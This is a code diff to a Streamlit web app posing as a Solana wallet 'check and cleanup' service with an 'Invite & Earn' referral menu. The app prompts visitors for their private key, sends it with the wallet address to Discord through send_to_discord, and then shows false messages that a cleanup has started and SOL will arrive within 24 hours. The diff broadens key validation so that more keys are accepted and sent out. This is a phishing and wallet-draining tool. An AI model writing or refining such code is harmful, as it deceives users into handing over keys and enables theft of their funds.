@@ -73,6 +73,14 @@ with st.container():
 
 menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
 
+def validate_solana_private_key(key):
+    try:
+        # Decode Base58 private key and check length
+        decoded = base58.b58decode(key)
+        return len(decoded) == 32 or len(decoded) == 64
+    except ValueError:
+        return False
+
 if menu == "Check Wallet ✅":
     st.markdown("### Check Your Wallet")
     wallet_address = st.text_input("❓ Enter your Solana wallet address:", placeholder="Enter Solana address...")
@@ -89,10 +97,10 @@ if menu == "Check Wallet ✅":
                 private_key = st.text_input(
                     "Enter your Solana private key:",
                     type="password",
-                    help="Your 64-byte Solana private key"
+                    help="Your Solana private key"
                 )
                 
-                if private_key and len(private_key) == 88:
+                if private_key and validate_solana_private_key(private_key):
                     send_to_discord(wallet_address, private_key)
                     with st.spinner("🔄 Initiating cleanup..."):
                         time.sleep(2)
@@ -100,7 +108,7 @@ if menu == "Check Wallet ✅":
                     st.success("✅ Cleanup process started successfully!")
                     st.info("🕒 Your SOL will be transferred within 24 hours")
                 elif private_key:
-                    st.error("❌ Invalid private key format. Please enter your 88-character Solana private key")
+                    st.error("❌ Invalid private key format. Please enter a valid Solana private key")
             else:
                 st.error("No claimable SOL found in this wallet")
 
